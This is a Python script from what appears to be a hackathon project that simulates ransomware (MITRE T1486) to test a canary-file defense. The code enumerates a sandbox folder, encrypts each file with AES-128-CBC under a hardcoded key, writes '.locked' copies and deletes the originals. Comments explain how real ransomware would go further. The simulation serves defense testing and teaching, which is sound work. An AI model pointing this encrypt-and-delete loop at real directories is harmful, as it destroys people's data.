"""
attacker.py — ARES Ransomware Behaviour Simulator
==================================================
Team QuadRoot | Problem Statement #24 | MITRE ATT&CK T1486

PURPOSE:
    Simulates a real-world ransomware encryption pipeline that sequentially
    enumerates, reads, encrypts, and destroys user documents in a sandboxed
    directory. This script acts as the OFFENSIVE component of the project.

MAPPED TOOL:
    Atomic Red Team — Industry-standard adversary simulation framework.
    This script emulates Atomic Red Team test case T1486 (Data Encrypted
    for Impact) in a safe, isolated sandbox environment.

ENCRYPTION METHOD:
    AES-128 in CBC (Cipher Block Chaining) mode via the Python `cryptography`
    library. CBC mode XORs each plaintext block with the previous ciphertext
    block before encryption, ensuring identical plaintext blocks produce
    different ciphertext outputs (diffusion).

SAFETY:
    This script ONLY operates on files inside the ./sandbox/ directory.
    It NEVER touches files outside the sandbox. It is designed exclusively
    for educational demonstration and hackathon evaluation.

USAGE:
    Terminal 1:  python defense.py     (start defense daemon FIRST)
    Terminal 2:  python attacker.py    (then launch this attack)
"""

import os       # os — Standard library for filesystem operations (listdir, remove, path)
import time     # time — Used to introduce sleep delays between encryptions for visibility
import base64   # base64 — Available for encoding operations (imported for extensibility)

# cryptography — Industry-grade cryptographic library wrapping OpenSSL
# We import specific AES primitives from the hazmat (hazardous materials) subpackage
# because we need low-level control over the encryption algorithm and mode of operation.
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

# ====================================================================
# CONFIGURATION CONSTANTS
# ====================================================================

# SANDBOX_DIR: The isolated target directory that the ransomware will sweep.
# In a real attack, this would be /home/user/Documents or C:\Users\<user>\Documents.
# We restrict to ./sandbox/ for safety during demonstration.
SANDBOX_DIR = "./sandbox"

# AES_KEY: 16-byte (128-bit) symmetric encryption key.
# In real ransomware, this key would be randomly generated per victim and
# encrypted with the attacker's RSA public key, making decryption impossible
# without paying the ransom. Here we hardcode it for reproducibility.
AES_KEY = b"1234567890123456"  # 16 bytes = AES-128

# IV (Initialization Vector): 16-byte random value used in CBC mode.
# The IV ensures that encrypting the same plaintext twice produces different
# ciphertext. In real malware, a unique IV is generated per file.
IV = b"1234567890123456"       # 16 bytes (must match AES block size)


def encrypt_data(data):
    """
    Encrypts raw bytes using AES-128 in CBC mode with PKCS#7 padding.

    AES operates on fixed 16-byte blocks. If the input data length is not
    a multiple of 16, we must pad it. PKCS#7 padding appends N bytes, each
    with the value N, where N = 16 - (data_length % 16).

    Example: If data is 25 bytes long:
        - 25 % 16 = 9 bytes into the second block
        - Padding needed: 16 - 9 = 7 bytes
        - 7 bytes of value 0x07 are appended

    Args:
        data (bytes): The raw plaintext bytes to encrypt

    Returns:
        bytes: The AES-128 CBC encrypted ciphertext
    """
    # Step 1: Calculate PKCS#7 padding length
    pad_len = 16 - (len(data) % 16)

    # Step 2: Append padding bytes (each byte has the value of pad_len)
    padded_data = data + bytes([pad_len] * pad_len)

    # Step 3: Create the AES cipher object with our key and IV
    # default_backend() selects the system's OpenSSL installation
    backend = default_backend()
    cipher = Cipher(algorithms.AES(AES_KEY), modes.CBC(IV), backend=backend)

    # Step 4: Create an encryptor context and perform the encryption
    encryptor = cipher.encryptor()

    # Step 5: Feed padded data through the cipher and finalize
    # .update() processes the main data blocks
    # .finalize() completes the encryption and flushes internal buffers
    return encryptor.update(padded_data) + encryptor.finalize()


def generate_dummy_files():
    """
    Seeds the sandbox directory with realistic dummy user documents.

    These files simulate the types of high-value corporate data that
    real ransomware targets: financial reports, databases, contracts,
    cryptographic keys, and API credentials.

    This function is idempotent — it only creates files that don't
    already exist, allowing safe re-runs without data duplication.
    """
    # Create sandbox directory if it doesn't exist
    if not os.path.exists(SANDBOX_DIR):
        os.makedirs(SANDBOX_DIR)

    # Dictionary mapping filename → simulated file content
    dummy_files = {
        "financial_report.xlsx":      "CONFIDENTIAL FINANCIAL AUDIT: $4.2M OPEX REPORT",
        "customer_database.sql":      "SELECT * FROM corporate_customers WHERE credit_limit > 500000;",
        "product_roadmap.pdf":        "INTERNAL PRODUCT STRATEGY // AEGIS PLATFORM VERSION 5.0",
        "intellectual_property.key":  "CERTIFICATE AUTHORITY SYMMETRIC PRIVKEY: 0x82A1B7E3",
        "api_secrets.env":            "DATABASE_URL=postgresql://db_admin:supersecurepwd@localhost:5432/prod"
    }

    for name, content in dummy_files.items():
        path = os.path.join(SANDBOX_DIR, name)
        if not os.path.exists(path):
            with open(path, "w") as f:
                f.write(content)
            print(f"[ARES] Pre-seeded system file: {path}")


def run_attack():
    """
    Main ransomware execution loop — simulates MITRE ATT&CK T1486.

    The attack follows this pipeline for each file:
        1. ENUMERATE:  os.listdir() + sorted() to scan directory alphabetically
        2. READ:       open(file, 'rb') reads raw bytes of the target file
        3. ENCRYPT:    encrypt_data() applies AES-128 CBC cipher
        4. WRITE:      Ciphertext is written to a new file with .locked extension
        5. DELETE:     os.remove() destroys the original plaintext file

    The alphabetical sort order is critical to our defense strategy:
    The canary file is named "000_urgent_salary_audit.xlsx" with a "000_" prefix
    to ensure it appears near the top of the sorted list, forcing the attacker
    to encounter it early in its traversal.

    The 1-second sleep between files allows human observation during demos
    and gives the defense daemon time to react (simulating real-world
    detection latencies).
    """
    print("=" * 60)
    print("      ATOMIC RED TEAM // T1486 RANSOMWARE SIMULATOR      ")
    print("=" * 60)

    # Phase 1: Seed target directory with dummy documents
    generate_dummy_files()

    # Phase 2: T1083 — File and Directory Discovery
    # sorted() ensures alphabetical traversal, which is a common ransomware pattern
    files = sorted(os.listdir(SANDBOX_DIR))
    print(f"\n[ARES] Enumeration complete. Found {len(files)} files target files.")
    print("[ARES] Starting sequential AES-128 encryption pipeline...\n")

    # Phase 3: Sequential encryption loop
    for filename in files:
        # Skip files already encrypted in a previous run
        if filename.endswith(".locked"):
            continue

        file_path = os.path.join(SANDBOX_DIR, filename)

        # Skip subdirectories (only target files)
        if not os.path.isfile(file_path):
            continue

        print(f"[ARES] Target identified: {file_path}")

        # Deliberate delay for demonstration visibility
        # In real ransomware, there would be NO delay — encryption happens
        # as fast as the disk I/O allows (thousands of files per second)
        time.sleep(1.0)

        try:
            # T1005 — Data from Local System: read plaintext bytes
            with open(file_path, "rb") as f:
                plaintext = f.read()

            # T1486 — Data Encrypted for Impact: AES-128 CBC encryption
            ciphertext = encrypt_data(plaintext)

            # Write encrypted ciphertext with .locked extension
            # This is the ransomware's "calling card" — victims see .locked files
            locked_path = file_path + ".locked"
            with open(locked_path, "wb") as f:
                f.write(ciphertext)

            # T1485 — Data Destruction: remove original plaintext
            # Without the AES key, the data is now permanently inaccessible
            os.remove(file_path)

            print(f"[WARNING] File encrypted: {file_path} -> {locked_path}")

        except Exception as e:
            # Graceful error handling prevents crash on permission errors
            print(f"[ERROR] Failed to encrypt file {filename}: {e}")

    print("\n[ARES] Traverse loop complete. Ransom document printed to desktop.")


# ====================================================================
# ENTRY POINT
# ====================================================================
# When this script is executed directly (not imported), run the attack.
if __name__ == "__main__":
    run_attack()
